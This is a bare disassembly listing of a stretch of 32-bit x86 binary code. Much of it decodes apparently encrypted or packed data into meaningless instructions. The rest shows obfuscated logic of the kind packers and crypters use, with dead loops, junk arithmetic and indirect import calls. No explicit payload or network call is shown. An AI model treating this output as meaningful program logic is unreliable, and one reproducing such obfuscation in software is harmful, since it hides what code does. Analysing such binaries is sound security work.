  415fee:	sub    al,0xa8
  415ff0:	fcomp  QWORD PTR [edx]
  415ff2:	fiadd  WORD PTR ds:0xedd3e42f
  415ff8:	dec    esp
  415ff9:	pop    es
  415ffa:	outs   dx,DWORD PTR ds:[esi]
  415ffb:	add    ebp,ebp
  415ffd:	hlt    
  415ffe:	out    dx,al
  415fff:	shr    DWORD PTR [ecx+0x62f2692b],cl
  416005:	retf   0x8b13
  416008:	pop    ebp
  416009:	fistp  DWORD PTR [eax+edx*8-0x20f5ba60]
  416010:	in     al,0x47
  416012:	sub    esi,DWORD PTR [edx-0x6]
  416015:	sub    bh,BYTE PTR [ebx+0x2b]
  416018:	sub    eax,0x4cee2b73
  41601d:	iret   
  41601e:	cs pop esp
  416020:	xlat   BYTE PTR ds:[ebx]
  416021:	sbb    DWORD PTR [ebx+0x4e62fe17],ebx
  416027:	jae    0x416037
  416029:	sbb    DWORD PTR ss:[esi-0x562e90c6],eax
  416030:	cmp    al,0xab
  416032:	xor    ebx,DWORD PTR [esi-0x2934accc]
  416038:	rep outs dx,BYTE PTR ds:[esi]
  41603a:	cld    
  41603b:	xchg   ebp,eax
  41603c:	add    eax,0xb27bca65
  416041:	inc    ebx
  416042:	pop    ecx
  416043:	cmp    eax,0x6332612f
  416048:	ins    DWORD PTR es:[edi],dx
  416049:	sbb    ebp,DWORD PTR [ebx]
  41604b:	ror    DWORD PTR [edx-0x7199be6c],1
  416051:	mov    bl,0x9
  416053:	mov    ?,ecx
  416055:	xor    edx,DWORD PTR [ebx-0x73]
  416058:	icebp  
  416059:	xchg   dh,dh
  41605b:	xchg   ebp,eax
  41605c:	and    eax,0xe772bb5a
  416061:	sub    eax,0xb7a27907
  416066:	das    
  416067:	imul   esp,DWORD PTR [ebx+eiz*2],0xae76cb81
  41606e:	gs push ebx
  416070:	mov    ebp,0xfcaa6cfc
  416075:	push   ebp
  416076:	jb     0x4160c9
  416078:	adc    al,0x3e
  41607a:	out    dx,al
  41607b:	lock push ebp
  41607d:	xchg   ebp,eax
  41607e:	cmp    eax,0xc40b22a
  416083:	xor    eax,0x5b91e0e6
  416088:	xchg   edx,eax
  416089:	mov    edx,0xa145207b
  41608e:	mov    bh,0xd9
  416090:	cmp    ah,BYTE PTR [ebx]
  416092:	fs push ds
  416094:	rol    BYTE PTR [eax+0x6de822c],1
  41609a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41609b:	push   edi
  41609c:	push   0x4d
  41609e:	push   esp
  41609f:	push   esi
  4160a0:	add    eax,0xbbd74064
  4160a5:	cmp    ebp,esi
  4160a7:	jp     0x416030
  4160a9:	pop    esi
  4160aa:	xor    BYTE PTR [ecx+0x29bb63e1],bl
  4160b0:	jecxz  0x416111
  4160b2:	push   edx
  4160b3:	push   eax
  4160b4:	js     0x4160db
  4160b6:	ja     0x41612c
  4160b8:	xchg   edi,eax
  4160b9:	dec    esp
  4160ba:	sub    edx,0x11417089
  4160c0:	push   es
  4160c1:	jne    0x41610f
  4160c3:	xchg   ecx,eax
  4160c4:	out    0x85,eax
  4160c6:	dec    esi
  4160c7:	xor    al,0x85
  4160c9:	ret    
  4160ca:	imul   ebp,DWORD PTR [ebx],0x31
  4160cd:	aam    0xbf
  4160cf:	out    0x93,eax
  4160d1:	or     bl,BYTE PTR [ecx-0x62]
  4160d4:	out    0xa3,al
  4160d6:	retf   
  4160d7:	test   bh,cl
  4160d9:	iret   
  4160da:	sahf   
  4160db:	mov    ebp,0xb75527ff
  4160e0:	out    0x34,eax
  4160e2:	sbb    esp,ebp
  4160e4:	rol    DWORD PTR [ecx],0x4a
  4160e7:	sbb    al,0x4c
  4160e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160ea:	jle    0x41612f
  4160ec:	fmul   st(0),st
  4160ee:	imul   esp,DWORD PTR [ebx],0xffffffd7
  4160f1:	add    esp,ebp
  4160f3:	jmp    0xf1af81fb
  4160f8:	jle    0x41616c
  4160fa:	adc    al,0xe
  4160fc:	jb     0x41617a
  4160fe:	clc    
  4160ff:	test   BYTE PTR [ebp+0x31d2354d],0x62
  416106:	(bad)  
  416107:	push   cs
  416108:	mov    cl,0x96
  41610a:	lods   al,BYTE PTR ds:[esi]
  41610b:	adc    eax,0xbfb91da5
  416110:	cmp    ecx,0xdbb7d01a
  416116:	push   0x56
  416118:	clc    
  416119:	cmp    al,0xbf
  41611b:	jo     0x41614f
  41611d:	cmp    DWORD PTR [ecx],0x70389531
  416123:	pop    DWORD PTR [esi]
  416125:	in     al,0x65
  416127:	sbb    DWORD PTR [esi],ebp
  416129:	cmp    edi,ebx
  41612b:	adc    BYTE PTR [edx+ebp*4+0x62],0x16
  416130:	out    dx,al
  416131:	add    ch,al
  416133:	mov    eax,ds:0x99dbe4d7
  416138:	ins    BYTE PTR es:[edi],dx
  416139:	push   eax
  41613a:	mov    al,0x33
  41613c:	mov    bl,0x42
  41613e:	ds push eax
  416140:	jecxz  0x41618e
  416142:	xor    eax,0x4c475f21
  416147:	push   ds
  416148:	mov    ecx,0xd76a183
  41614d:	inc    edx
  41614e:	sbb    DWORD PTR [edi],ebp
  416150:	jno    0x41613f
  416152:	jno    0x41615a
  416154:	sbb    dl,BYTE PTR [ecx-0x59]
  416157:	ja     0x416105
  416159:	xchg   esp,eax
  41615a:	mov    ebx,DWORD PTR [ebx+0x60ad6926]
  416160:	fwait
  416161:	adc    al,0x6d
  416163:	sbb    BYTE PTR [edi],dl
  416165:	or     DWORD PTR [edx],eax
  416167:	(bad)  
  416168:	and    ecx,DWORD PTR [ebx]
  41616a:	xor    BYTE PTR [edx-0x5d],ah
  41616d:	dec    ebx
  41616e:	ins    BYTE PTR es:[edi],dx
  41616f:	repz add BYTE PTR ss:[ebx+0x2d32a4c3],0x5e
  416178:	pop    ebx
  416179:	pop    ebp
  41617a:	sbb    esp,ebx
  41617c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41617d:	(bad)  
  41617e:	in     eax,dx
  41617f:	inc    esi
  416180:	jmp    0x22203e19
  416185:	test   BYTE PTR [edi],bh
  416187:	rol    DWORD PTR [esi-0x67],1
  41618a:	aam    0x3
  41618c:	pop    eax
  41618d:	stos   DWORD PTR es:[edi],eax
  41618e:	ret    0x84bf
  416191:	push   ss
  416192:	test   BYTE PTR [esp+ecx*8+0x4332037c],ch
  416199:	push   esp
  41619a:	cli    
  41619b:	or     al,0xdc
  41619d:	mov    ds:0x738069b2,al
  4161a2:	hlt    
  4161a3:	adc    al,0xf3
  4161a5:	mov    edi,0x1d8aac12
  4161aa:	push   eax
  4161ac:	xchg   edi,eax
  4161ad:	lods   al,BYTE PTR ds:[esi]
  4161ae:	loopne 0x416194
  4161b0:	mov    edx,0x5850d177
  4161b5:	xchg   ebx,eax
  4161b6:	stc    
  4161b7:	mov    BYTE PTR [eax-0x60e7d340],dh
  4161bd:	mov    eax,DWORD PTR [eax]
  4161bf:	fmul   QWORD PTR [ebx]
  4161c1:	push   esp
  4161c2:	pop    ss
  4161c3:	ins    BYTE PTR es:[edi],dx
  4161c4:	xor    edx,edi
  4161c6:	out    0xd7,eax
  4161c8:	xchg   edi,eax
  4161c9:	mov    ds:0xa0035d64,al
  4161ce:	jecxz  0x416183
  4161d0:	outs   dx,DWORD PTR ds:[esi]
  4161d1:	imul   edi,ecx,0x45a8c879
  4161d7:	xchg   DWORD PTR [esi+0x24],ebx
  4161da:	gs cli 
  4161dc:	mov    ecx,DWORD PTR [ecx]
  4161de:	les    ebp,FWORD PTR [ebx]
  4161e0:	mov    eax,0x508af91e
  4161e5:	out    dx,eax
  4161e6:	jmp    DWORD PTR [edx-0x40]
  4161e9:	xchg   ebp,eax
  4161ea:	stc    
  4161eb:	mov    ah,0x9c
  4161ed:	or     ecx,esi
  4161ef:	cmp    BYTE PTR [ecx-0x15],dh
  4161f2:	cmp    al,0x99
  4161f4:	jecxz  0x416242
  4161f6:	jmp    0x41625f
  4161f8:	cmc    
  4161f9:	(bad)  [eax+eax*8-0x476f5d83]
  416200:	mov    WORD PTR [ebx],es
  416202:	adc    al,0xfd
  416204:	popf   
  416205:	jg     0x416258
  416207:	imul   ecx,edx,0xdcb67784
  41620d:	jbe    0x416192
  41620f:	aas    
  416210:	xor    BYTE PTR [edx-0x3f4c248d],0xd6
  416217:	test   al,0x61
  416219:	sub    esp,DWORD PTR ds:0xea63fb32
  41621f:	mov    ch,0x1
  416221:	out    dx,eax
  416222:	xchg   edi,eax
  416223:	cmc    
  416224:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416225:	xchg   ebx,eax
  416226:	inc    edi
  416227:	cmc    
  416228:	add    esp,ebx
  41622a:	(bad)  
  41622b:	ror    BYTE PTR [edx+0xb],1
  41622e:	dec    ebx
  41622f:	inc    esi
  416230:	stc    
  416231:	add    dl,dh
  416233:	xor    edx,DWORD PTR [ebp-0x6e]
  416236:	cli    
  416237:	clc    
  416238:	sti    
  416239:	jb     0x4161fa
  41623b:	sub    dl,bh
  41623d:	in     eax,dx
  41623e:	xchg   ebx,eax
  41623f:	clc    
  416240:	jns    0x416224
  416242:	cmp    al,0xde
  416244:	jo     0x416278
  416246:	test   al,0x94
  416248:	loope  0x41626d
  41624a:	pop    edi
  41624b:	mov    dh,0xde
  41624d:	jge    0x41629c
  41624f:	test   BYTE PTR [ebp-0x3e],ah
  416252:	lahf   
  416253:	ss call 0xf6ad:0x738c2804
  41625b:	dec    ebx
  41625c:	dec    edi
  41625d:	ds jmp 0xa4bb:0x3de74681
  416265:	je     0x416208
  416267:	jnp    0x416213
  416269:	dec    ecx
  41626a:	rol    DWORD PTR [edx],cl
  41626c:	clc    
  41626d:	ins    BYTE PTR es:[edi],dx
  41626e:	push   0xffffffc8
  416270:	dec    ebx
  416271:	repnz in al,dx
  416273:	cmp    al,0xb5
  416275:	mov    al,ds:0xccdcd395
  41627a:	in     al,dx
  41627b:	push   0x47
  41627d:	arpl   sp,si
  41627f:	ss (bad) 
  416281:	xor    ecx,ebp
  416283:	mov    esp,DWORD PTR [ebx]
  416285:	mov    DWORD PTR [edx-0x6e],ecx
  416288:	mov    esp,0x121d57d8
  41628d:	jmp    0x5b1e:0xc0fc7a6b
  416294:	int    0x72
  416296:	enter  0x3ae7,0xc2
  41629a:	mov    dl,0xc1
  41629c:	div    BYTE PTR [ebx-0x150dc4c3]
  4162a2:	sub    bh,ch
  4162a4:	test   eax,0x2258aa0a
  4162a9:	push   0x55
  4162ab:	pop    es
  4162ac:	jle    0x4162dc
  4162ae:	xchg   edx,eax
  4162af:	and    ah,cl
  4162b1:	out    dx,eax
  4162b2:	push   cs
  4162b3:	in     al,dx
  4162b4:	stos   BYTE PTR es:[edi],al
  4162b5:	in     al,0x5f
  4162b7:	das    
  4162b8:	add    dh,bl
  4162ba:	pop    ss
  4162bb:	in     eax,0x49
  4162bd:	fst    DWORD PTR [edi+edx*8-0x39]
  4162c1:	stc    
  4162c2:	popf   
  4162c3:	jg     0x4162c2
  4162c5:	cmp    BYTE PTR [ebp+0x73],al
  4162c8:	dec    eax
  4162c9:	dec    eax
  4162ca:	(bad)  
  4162cb:	pop    esi
  4162cc:	(bad)  [edx+0x38]
  4162cf:	sub    DWORD PTR [eax+0x790e7c7e],edi
  4162d5:	cwde   
  4162d6:	(bad)  
  4162d8:	adc    esi,DWORD PTR [edx+0x4d8d6a3d]
  4162de:	pop    ebp
  4162df:	dec    ebx
  4162e0:	xchg   BYTE PTR [edx-0x59fc154b],bl
  4162e6:	jecxz  0x4162d9
  4162e8:	xchg   dl,bl
  4162ea:	and    ecx,ebp
  4162ec:	out    dx,eax
  4162ed:	sahf   
  4162ee:	ds addr16 cs dec ebp
  4162f2:	pop    edi
  4162f3:	push   ss
  4162f4:	mov    ds:0xd183286f,al
  4162f9:	inc    esp
  4162fa:	imul   DWORD PTR [edi+0x19aa31ba]
  416300:	daa    
  416301:	call   DWORD PTR [ebx+edi*4+0x56]
  416305:	shr    DWORD PTR [ebp-0x621ab7f0],0xf6
  41630c:	hlt    
  41630d:	cmp    eax,0x6006b15a
  416312:	data16 mov dl,0x3a
  416315:	adc    cl,BYTE PTR [esi-0x37]
  416318:	cmp    eax,DWORD PTR [ebp+0x8426343]
  41631e:	dec    esp
  41631f:	ds xor edi,DWORD PTR es:[bx+si-0x70]
  416325:	inc    ecx
  416326:	jo     0x41637b
  416328:	(bad)  [edi-0x1b]
  41632b:	jge    0x41635d
  41632d:	or     dh,cl
  41632f:	jl     0x41634e
  416331:	add    al,0xa1
  416333:	punpckhwd mm7,QWORD PTR [eax+eiz*2-0x5f302eda]
  41633b:	push   esp
  41633c:	sub    bl,ch
  41633e:	push   ebx
  41633f:	leave  
  416340:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416341:	mov    edx,eax
  416343:	pop    ss
  416344:	std    
  416345:	jl     0x416332
  416347:	xchg   ebx,eax
  416348:	mov    esp,0x3092dafa
  41634d:	mov    ds:0xeb5d1610,al
  416352:	lods   eax,DWORD PTR ds:[esi]
  416353:	mov    dh,0xc7
  416355:	inc    ebx
  416356:	mov    ds,WORD PTR [ecx-0x359c8382]
  41635c:	bound  esp,QWORD PTR [ecx+0x67c5bdaa]
  416362:	into   
  416363:	outs   dx,DWORD PTR ds:[esi]
  416364:	je     0x41630d
  416366:	imul   ecx,DWORD PTR [edi+0x4709bf49],0xa320d4bc
  416370:	js     0x41636a
  416372:	add    al,0xa8
  416374:	mov    al,0x20
  416376:	push   esi
  416377:	cmc    
  416378:	mov    ah,0x12
  41637a:	and    bh,al
  41637c:	or     eax,DWORD PTR [edi+0x9]
  41637f:	ss jnp 0x4163b0
  416382:	enter  0xbbb5,0xc7
  416386:	pop    ecx
  416387:	cmp    dl,0xa2
  41638a:	pop    es
  41638b:	push   ebx
  41638c:	retf   
  41638d:	scas   eax,DWORD PTR es:[edi]
  41638e:	imul   ebp,DWORD PTR ds:0x4a54683d,0xffffffc4
  416395:	stos   BYTE PTR es:[edi],al
  416396:	mov    dl,ch
  416398:	out    dx,al
  416399:	sbb    DWORD PTR [ecx+eiz*8+0x22cc6a87],ecx
  4163a0:	and    al,0xeb
  4163a2:	jo     0x416337
  4163a4:	sbb    BYTE PTR [ecx-0x64],ah
  4163a7:	sub    eax,DWORD PTR [ecx]
  4163a9:	pop    ss
  4163aa:	loop   0x41635c
  4163ac:	int    0x3a
  4163ae:	mov    ebx,0x5a2823b1
  4163b3:	fadd   DWORD PTR [edi-0x12daf5ec]
  4163b9:	dec    ecx
  4163ba:	scas   eax,DWORD PTR es:[edi]
  4163bb:	bound  ebx,QWORD PTR [ebx-0x1a]
  4163be:	inc    ecx
  4163bf:	or     al,0xcc
  4163c1:	repnz mov edi,0x6fbfc38e
  4163c7:	inc    ecx
  4163c8:	cmp    edi,ebp
  4163ca:	mov    cl,0xa1
  4163cd:	add    al,0x4c
  4163cf:	(bad)
  4163d4:	arpl   di,sp
  4163d6:	inc    edi
  4163d7:	call   FWORD PTR [ebx+0x2c051aec]
  4163dd:	push   esi
  4163de:	jl     0x4163f4
  4163e0:	jl     0x4163fb
  4163e2:	dec    esi
  4163e3:	inc    ebx
  4163e4:	inc    ebx
  4163e5:	add    BYTE PTR [ecx],bl
  4163e7:	lea    eax,[edx]
  4163e9:	add    esp,DWORD PTR [esi-0xd]
  4163ec:	leave  
  4163ed:	out    0xd9,al
  4163ef:	push   ds
  4163f0:	xchg   ebx,eax
  4163f1:	mov    edi,DWORD PTR [ecx]
  4163f3:	push   ss
  4163f4:	(bad)  
  4163f5:	lds    ebp,FWORD PTR [ebp-0xdef653e]
  4163fb:	push   0x95677288
  416400:	pop    edx
  416401:	ret    
  416402:	cmp    eax,0x24e771df
  416407:	out    dx,al
  416408:	dec    edx
  416409:	jnp    0x416456
  41640b:	mov    ds:0x929b6b14,eax
  416410:	mov    WORD PTR [si-0x4a48],cs
  416415:	inc    esp
  416416:	or     BYTE PTR [ecx+0x6d6a4525],bh
  41641c:	pop    esp
  41641d:	cli    
  41641e:	or     BYTE PTR [eax+0x4d280331],dl
  416424:	add    esi,DWORD PTR [edi]
  416426:	adc    eax,0x3f7547cf
  41642b:	adc    eax,DWORD PTR [esi+0x3f49775d]
  416431:	fsubr  QWORD PTR [ebp+0x78]
  416434:	mov    WORD PTR [esi+ecx*1+0xf],?
  416438:	mov    bl,0x67
  41643a:	or     dl,BYTE PTR [edi]
  41643c:	aam    0x25
  41643e:	inc    ebp
  41643f:	(bad)  
  416440:	iret   
  416441:	push   ecx
  416442:	push   esi
  416443:	push   0x4d8cafdf
  416448:	xchg   esi,eax
  416449:	mov    edi,0x8f77679a
  41644e:	aaa    
  41644f:	adc    BYTE PTR [edi+eax*2-0x2ca40f9e],dl
  416456:	push   0xae3db1bd
  41645b:	push   ds
  41645c:	bound  ecx,QWORD PTR [esi-0xb]
  41645f:	stc    
  416460:	das    
  416461:	push   edx
  416462:	fld    QWORD PTR [edx+0x1dbe8353]
  416468:	jg     0x4164a3
  41646a:	les    edx,FWORD PTR [edx+0x29]
  41646d:	jecxz  0x416456
  41646f:	sar    edi,1
  416471:	outs   dx,DWORD PTR ds:[esi]
  416472:	add    al,cl
  416474:	jbe    0x41641b
  416476:	fwait
  416477:	cdq    
  416478:	addr16 sub eax,0xe0c2f33d
  41647e:	and    BYTE PTR [esi],0xd8
  416481:	rcr    BYTE PTR [ebx-0x31],cl
  416484:	xor    BYTE PTR [ecx+ebp*4],0x4a
  416488:	test   al,0x29
  41648a:	out    dx,al
  41648b:	mov    ?,edx
  41648d:	xchg   esp,eax
  41648e:	add    eax,0x2fad4df3
  416493:	stc    
  416494:	es popf 
  416496:	inc    ebx
  416497:	push   ecx
  416498:	inc    ebp
  416499:	test   eax,0xc5a4d7f7
  41649e:	xchg   DWORD PTR [ebx],ebx
  4164a0:	pusha  
  4164a1:	je     0x416472
  4164a3:	shr    BYTE PTR ds:0xddd36199,1
  4164a9:	std    
  4164aa:	xchg   BYTE PTR [ecx],cl
  4164ac:	and    DWORD PTR [ebx],edx
  4164ae:	xchg   ebx,eax
  4164af:	push   esp
  4164b0:	sub    DWORD PTR [edi],edx
  4164b2:	inc    DWORD PTR [esi-0x69]
  4164b5:	xor    ebp,DWORD PTR [ebp-0x57]
  4164b8:	xchg   edx,eax
  4164b9:	pop    ecx
  4164ba:	xor    BYTE PTR [ebx-0x3f],bh
  4164bd:	sbb    ebx,DWORD PTR [ecx-0x57e17141]
  4164c3:	test   eax,0x804a7537
  4164c8:	cmp    al,0xa0
  4164ca:	or     al,0x4
  4164cc:	inc    edi
  4164cd:	sbb    BYTE PTR [edi+0x479a79ad],dh
  4164d3:	mov    esp,0xcab18881
  4164d8:	fiadd  WORD PTR ds:0x30a3033b
  4164de:	ins    DWORD PTR es:[edi],dx
  4164df:	int    0xf8
  4164e1:	jmp    0x723848cd
  4164e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164e7:	pop    ebp
  4164e8:	int    0xbe
  4164ea:	mov    edi,0x176c747f
  4164ef:	inc    ebp
  4164f0:	(bad)  
  4164f1:	dec    ecx
  4164f2:	xor    esi,DWORD PTR [ebp+0x326ca200]
  4164f8:	aas    
  4164f9:	pop    edi
  4164fa:	retf   
  4164fb:	add    bl,cl
  4164fd:	call   0x2d05:0xc4ae08a0
  416504:	cmp    BYTE PTR [ebx+0x21],ah
  416507:	rcr    DWORD PTR [eax-0x70],1
  41650a:	shl    DWORD PTR [esi],1
  41650c:	ins    BYTE PTR es:[edi],dx
  41650d:	mov    BYTE PTR [eax+0x1d],al
  416510:	test   DWORD PTR [eax+edx*2-0x2e],ebp
  416514:	clc    
  416515:	or     edi,DWORD PTR [esi+eiz*8+0x5825437f]
  41651c:	xor    eax,0xc162a845
  416521:	sub    DWORD PTR [edi+0x73],ecx
  416524:	hlt    
  416525:	jno    0x416579
  416527:	jb     0x416591
  416529:	sahf   
  41652a:	cmp    al,0x7c
  41652c:	outs   dx,DWORD PTR ds:[esi]
  41652d:	xchg   ebx,eax
  41652e:	push   esi
  41652f:	adc    BYTE PTR [ebx-0x12],dl
  416532:	xor    BYTE PTR [ebx-0x5571f65b],ah
  416538:	out    0xfd,eax
  41653a:	mov    BYTE PTR [edx],ch
  41653c:	in     eax,0x49
  41653e:	popf   
  41653f:	aaa    
  416540:	loopne 0x41655b
  416542:	xchg   ecx,eax
  416543:	movzx  ecx,WORD PTR [ecx+edx*4]
  416547:	xor    DWORD PTR ds:0x428ea7,0x428e77
  416551:	xor    ecx,0x8a9b
  416557:	mov    DWORD PTR ds:0x428ea3,0x5f74
  416561:	add    ecx,edi
  416563:	mov    edi,DWORD PTR [ebp-0xc]
  416566:	mov    DWORD PTR ds:0x428e73,0x23ca
  416570:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  416577:	inc    edx
  416578:	mov    ecx,DWORD PTR [ebp-0x10]
  41657b:	mov    DWORD PTR ds:0x428e37,0x4a6a
  416585:	cmp    edx,ecx
  416587:	mov    DWORD PTR ds:0x428e73,0x3902
  416591:	jne    0x414140
  416597:	mov    ecx,DWORD PTR [ebp-0x18]
  41659a:	mov    DWORD PTR ds:0x428ebf,0x19
  4165a4:	cmp    DWORD PTR ds:0x428ebf,0x0
  4165ab:	je     0x4165e3
  4165b1:	cmp    DWORD PTR ds:0x428ebf,0x1d
  4165b8:	jle    0x4165e3
  4165be:	jmp    0x4165d1
  4165c3:	push   DWORD PTR [ebp-0x14]
  4165c6:	push   0x8b92
  4165cb:	call   DWORD PTR ds:0x42aa13
  4165d1:	mov    edx,DWORD PTR ds:0x428ebf
  4165d7:	dec    edx
  4165d8:	mov    DWORD PTR ds:0x428ebf,edx
  4165de:	jmp    0x4165a4
  4165e3:	mov    edx,DWORD PTR [ebp+0x10]
  4165e6:	and    DWORD PTR ds:0x428e83,0x0
  4165f0:	mov    edi,DWORD PTR ds:0x428e83
  4165f6:	inc    edi
  4165f7:	mov    DWORD PTR ds:0x428e83,edi
  4165fd:	cmp    DWORD PTR ds:0x428e83,0x2c
  416604:	jg     0x416627
  41660a:	jmp    0x41661a
  41660f:	push   0x428e8f
  416614:	call   DWORD PTR ds:0x42aa17
  41661a:	cmp    DWORD PTR ds:0x428e83,0x1e
  416621:	jb     0x4165f0
  416627:	xor    ecx,eax
  416629:	add    DWORD PTR ds:0x428e97,edx
  41662f:	add    ecx,esi
  416631:	xor    DWORD PTR ds:0x428e57,edx
  416637:	mov    DWORD PTR [edx],ecx
  416639:	sbb    edi,ecx
  41663b:	mov    ecx,DWORD PTR [ebp-0x18]
  41663e:	xor    DWORD PTR ds:0x428ec7,ebx
  416644:	xor    ecx,eax
  416646:	add    ecx,esi
  416648:	mov    DWORD PTR ds:0x428ebb,0x1e
  416652:	cmp    DWORD PTR ds:0x428ebb,0x0
  416659:	je     0x4166a8
  41665f:	cmp    DWORD PTR ds:0x428ebb,0x2
  416666:	jbe    0x4166a8
  41666c:	jmp    0x41667c
  416671:	push   0x71f6
  416676:	call   DWORD PTR ds:0x42aa1b
  41667c:	cmp    DWORD PTR ds:0x428ebb,0x3
  416683:	jne    0x416696
  416689:	mov    edi,DWORD PTR ds:0x428ebb
  41668f:	dec    edi
  416690:	mov    DWORD PTR ds:0x428ebb,edi
  416696:	mov    edi,DWORD PTR ds:0x428ebb
  41669c:	dec    edi
  41669d:	mov    DWORD PTR ds:0x428ebb,edi
  4166a3:	jmp    0x416652
  4166a8:	mov    DWORD PTR [ebp-0xc],ecx
  4166ab:	sbb    DWORD PTR ds:0x428eab,0x39c1
  4166b5:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  4166bc:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  4166c3:	sbb    edi,ecx
  4166c5:	mov    DWORD PTR [ebp-0x10],0xf89c95a5
  4166cc:	mov    DWORD PTR ds:0x428e6f,0x17
  4166d6:	cmp    DWORD PTR ds:0x428e6f,0x0
  4166dd:	je     0x41671c
  4166e3:	cmp    DWORD PTR ds:0x428e6f,0x23
  4166ea:	jl     0x41671c
  4166f0:	jmp    0x41670a
  4166f5:	push   0x4cf4
  4166fa:	push   0x428e23
  4166ff:	push   0x15e1
  416704:	call   DWORD PTR ds:0x42aa1f
  41670a:	mov    edi,DWORD PTR ds:0x428e6f
  416710:	dec    edi
  416711:	mov    DWORD PTR ds:0x428e6f,edi
  416717:	jmp    0x4166d6
  41671c:	mov    ecx,DWORD PTR [ebp-0x14]
  41671f:	add    edi,DWORD PTR ds:0x428e3f
  416725:	mov    DWORD PTR [ebp+0x8],ecx
  416728:	sub    edi,0x632b
  41672e:	mov    ecx,DWORD PTR [ebp+0x8]
  416731:	xor    DWORD PTR ds:0x428e53,edi
  416737:	xor    ecx,eax
  416739:	mov    edi,DWORD PTR ds:0x428e9b
  41673f:	adc    DWORD PTR ds:0x428ebb,edi
  416745:	add    ecx,esi
  416747:	mov    edi,DWORD PTR ds:0x428e43
  41674d:	mov    ecx,0x242ebf1
  416752:	mov    edi,0xf641bf2
  416757:	mov    DWORD PTR ds:0x428e77,0x250d
  416761:	je     0x4191f8
  416767:	mov    edx,DWORD PTR [ebp+0x8]
  41676a:	mov    ebx,DWORD PTR [ebp-0x8]
  41676d:	neg    DWORD PTR ds:0x428e8f
  416773:	xor    edx,eax
  416775:	xor    ebx,eax
  416777:	sub    edx,ebx
  416779:	xor    DWORD PTR ds:0x428e63,edx
  41677f:	sub    edx,esi
  416781:	add    DWORD PTR ds:0x428eaf,0x644f
  41678b:	xor    edx,eax
  41678d:	or     DWORD PTR ds:0x428e27,0x4378
  416797:	mov    DWORD PTR [ebp+0x8],edx
  41679a:	and    DWORD PTR ds:0x428e67,0x0
  4167a4:	mov    edx,DWORD PTR ds:0x428e67
  4167aa:	inc    edx
  4167ab:	mov    DWORD PTR ds:0x428e67,edx
  4167b1:	cmp    DWORD PTR ds:0x428e67,0xe
  4167b8:	jl     0x4167f7
  4167be:	jmp    0x4167ce
  4167c3:	push   0x428111
  4167c8:	call   DWORD PTR ds:0x42a9eb
  4167ce:	cmp    DWORD PTR ds:0x428e67,0xd
  4167d5:	jne    0x4167ea
  4167db:	xor    edx,edx
  4167dd:	xor    edx,DWORD PTR ds:0x428e67
  4167e3:	inc    edx
  4167e4:	mov    DWORD PTR ds:0x428e67,edx
  4167ea:	cmp    DWORD PTR ds:0x428e67,0x1e
  4167f1:	jb     0x4167a4
  4167f7:	mov    edx,DWORD PTR [ebp+0x8]
  4167fa:	mov    ebx,DWORD PTR [ebp-0x58]
  4167fd:	adc    DWORD PTR ds:0x428eaf,0x428e9b
  416807:	add    edx,0x5708e4
  41680d:	imul   edx,ebx
  416810:	mov    ebx,DWORD PTR ds:0x428e87
  416816:	or     DWORD PTR ds:0x428e57,ebx
  41681c:	mov    DWORD PTR [ebp-0x58],edx
  41681f:	mov    edx,DWORD PTR ds:0x42972f
  416825:	mov    ebx,DWORD PTR ds:0x429baf
  41682b:	sub    ebx,edx
  41682d:	xor    edx,DWORD PTR [edx+ebx*1]
  416830:	mov    edx,DWORD PTR [ebp+0x8]
  416833:	mov    ebx,DWORD PTR [ebp-0x54]
  416836:	xor    DWORD PTR ds:0x428e5b,0x428e83
  416840:	add    edx,0x64f882
  416846:	and    DWORD PTR ds:0x428eab,0x41a4
  416850:	or     edx,ebx
  416852:	and    DWORD PTR ds:0x428e53,0x0
  41685c:	mov    ebx,DWORD PTR ds:0x428e53
  416862:	inc    ebx
  416863:	mov    DWORD PTR ds:0x428e53,ebx
  416869:	cmp    DWORD PTR ds:0x428e53,0x1d
  416870:	ja     0x416893
  416876:	jmp    0x416886
  41687b:	push   0x42815b
  416880:	call   DWORD PTR ds:0x42a9ef
  416886:	cmp    DWORD PTR ds:0x428e53,0x11
  41688d:	jb     0x41685c
  416893:	mov    DWORD PTR [ebp-0x54],edx
  416896:	mov    DWORD PTR ds:0x428e83,0x1e
  4168a0:	cmp    DWORD PTR ds:0x428e83,0x0
  4168a7:	je     0x4168f8
  4168ad:	cmp    DWORD PTR ds:0x428e83,0xe
  4168b4:	jb     0x4168f8
  4168ba:	jmp    0x4168ca
  4168bf:	push   0x8096
  4168c4:	call   DWORD PTR ds:0x42a9f3
  4168ca:	cmp    DWORD PTR ds:0x428e83,0xf
  4168d1:	jne    0x4168e6
  4168d7:	xor    edx,edx
  4168d9:	add    edx,DWORD PTR ds:0x428e83
  4168df:	dec    edx
  4168e0:	mov    DWORD PTR ds:0x428e83,edx
  4168e6:	mov    edx,DWORD PTR ds:0x428e83
  4168ec:	dec    edx
  4168ed:	mov    DWORD PTR ds:0x428e83,edx
  4168f3:	jmp    0x4168a0
  4168f8:	mov    edx,DWORD PTR [ebp+0x8]
  4168fb:	mov    ebx,DWORD PTR [ebp-0x50]
  4168fe:	sub    DWORD PTR ds:0x428e8b,0x428e67
  416908:	add    edx,ecx
  41690a:	xor    edx,ebx
  41690c:	xor    DWORD PTR ds:0x428e73,0x75fe
  416916:	mov    DWORD PTR [ebp-0x50],edx
  416919:	sbb    DWORD PTR ds:0x428eaf,0x1c33
  416923:	mov    edx,DWORD PTR [ebp+0x8]
  416926:	adc    DWORD PTR ds:0x428e4b,edx
  41692c:	mov    ebx,DWORD PTR [ebp-0x4c]
  41692f:	sbb    DWORD PTR ds:0x428e73,0x359
  416939:	add    edx,edi
  41693b:	add    DWORD PTR ds:0x428e33,0x428e43
  416945:	and    edx,ebx
  416947:	movzx  ebx,WORD PTR ds:0x428e3b
  41694e:	xor    DWORD PTR ds:0x428eb7,ebx
  416954:	mov    DWORD PTR [ebp-0x4c],edx
  416957:	add    ebx,DWORD PTR ds:0x428ebf
  41695d:	mov    edx,DWORD PTR [ebp+0x8]
  416960:	or     ebx,DWORD PTR ds:0x428e33
